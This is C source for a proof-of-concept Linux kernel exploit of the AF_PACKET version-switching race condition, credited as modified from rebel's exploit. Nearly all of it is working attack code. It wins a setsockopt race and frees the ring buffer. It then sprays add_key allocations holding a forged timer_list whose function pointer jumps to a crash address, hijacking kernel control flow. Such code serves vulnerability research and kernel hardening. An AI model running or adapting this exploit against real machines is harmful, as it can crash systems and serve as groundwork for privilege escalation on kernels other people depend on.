/* A PoC demonstrating control-flow hijacking, modified from rebel's exploit
 * Author: Lewis Chen
 */

#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>
#include "libexp.h"

#define CONF_RING_FRAMES 1
#define CRASH_IP 0xffffffffdeadbeef
#define SPRAY_NUM 0x200
#define FORK_NUM cpu_num*4

volatile int barrier = 1;
volatile int vers_switcher_done = 0;
int status_ptr[2];
int *stage;

struct tpacket_req3 tp;
int sfd;
int mapped = 0;

struct timer_list {
	void *next;
	void *prev;
	unsigned long		   expires;
	void					(*function)(unsigned long);
	unsigned long		   data;
	unsigned int					 flags;
	int					 slack;
};

void *setsockopt_thread(void *arg) {
	status_ptr[0] = 1;
	while(barrier);
	setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));
	return NULL;
}

void *vers_switcher(void *arg) {
	int val,x,y;

	status_ptr[1] = 1;
	while(barrier);

	while(1) {
		val = TPACKET_V1;
		x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

		y++;

		if(x != 0) break;

		val = TPACKET_V3;
		x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

		if(x != 0) break;

		y++;
	}

	fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);
	vers_switcher_done = 1;
	return NULL;
}

void wait_for_all_status(int status)
{
	int done = 0;
	while(1) {
		for(int i=0; i<2; i++) {
			if(status_ptr[i] != status) continue;
			if(i == 1) return;
		}
	}
}

#define BUFSIZE 1408
char exploitbuf[BUFSIZE];

void try_race(void)
{
	int fd, val, off;
	socklen_t l;
	struct tpacket_block_desc *pbd;
	pthread_t tid1, tid2;

	// allocate a socket
	fd = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));
	if (fd == -1) error_out("socket error");

	// set version to 3
	val = TPACKET_V3;
	setsockopt(fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

	// race to switch version
	sfd = fd;
	pthread_create(&tid1, NULL, setsockopt_thread, (void *)NULL);
	pthread_create(&tid2, NULL, vers_switcher, (void *)NULL);

	// wait for both threads to be ready, remove barrier and then yield execution
	wait_for_all_status(1);
	barrier = 0;
	usleep(1000);

	// wait for the result for at most 2 seconds since it may hang somehow
	long start = time(NULL);
	while(!vers_switcher_done) {
		usleep(100000);
		if(time(NULL) - start > 2) exit(2);
	}

	// now check whether the race is won
	l = sizeof(val);
	getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, &l);
	fprintf(stderr,"current packet version = %d\n",val);

	pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0);
	if(pbd == MAP_FAILED) {
		fprintf(stderr,"could not map pbd\n");
		exit(1);
	} else {
		off = pbd->hdr.bh1.offset_to_first_pkt;
		fprintf(stderr,"pbd->hdr.bh1.offset_to_first_pkt = %d\n",off);
	}

	if(val == TPACKET_V1 && off != 0) {
		fprintf(stderr,"*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\n");
	} else {
		fprintf(stderr,"race not won\n");
		exit(2);
	}

	munmap(pbd, tp.tp_block_size * tp.tp_block_nr);
}

void spray_func(int idx)
{
	while(*stage == 0);
	add_key_spray_num(exploitbuf, BUFSIZE, SPRAY_NUM);
}

int try_exploit(void)
{
	fprintf(stderr,"new exploit attempt starting, jumping to CRASH_IP\n");

	try_race();

	fprintf(stderr,"please wait up to a few minutes for timer to be executed. \
		if you ctrl-c now the kernel will hang. so don't do that.\n");
	fprintf(stderr,"closing socket and verifying..\n");

	usleep(100000);// give it some time for subprocess to launch

	//defragment(BUFSIZE, 0x100);
	// int fd = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));
	close(sfd);
	// close(fd);
	*stage = 1;
	// usleep(10000);// wait for the free to actually happen
	add_key_spray_num(exploitbuf, BUFSIZE, SPRAY_NUM);

	sleep(10);// crash should happen in 3 seconds, just in case
}

void setup_payload()
{
	struct timer_list *timer;
	memset(exploitbuf,'\x00',BUFSIZE);

	timer = (struct timer_list *)(exploitbuf+(0x6c*8)+6-8);
	timer->next = 0;
	timer->prev = 0;
	timer->expires = 4294943360;
	timer->function = (void *)CRASH_IP;
	timer->flags = 1;
	timer->slack = -1;

	tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
	tp.tp_block_nr = 1;
	tp.tp_frame_size = getpagesize();
	tp.tp_frame_nr = CONF_RING_FRAMES;
	// try to set the timeout to 3 seconds
	// the default timeout might still be used though depending on when the race was won
	tp.tp_retire_blk_tov = 3000;

	stage = umem_alloc(NULL, 0x1000);
	*stage = 0;

	for(int i=0; i<FORK_NUM; i++) {
		if(!clean_fork()) {
			setsid();
			spray_func(i);
			while(1);
		}
	}
}

int main() {
	fprintf(stderr,"linux AF_PACKET race condition exploit by rebel\n");
	fprintf(stderr, "set_memory_rw\n");

	// setup payload
	setup_payload();

	// try to exploit once
	setup_sandbox();
	try_exploit();
	return 0;
}
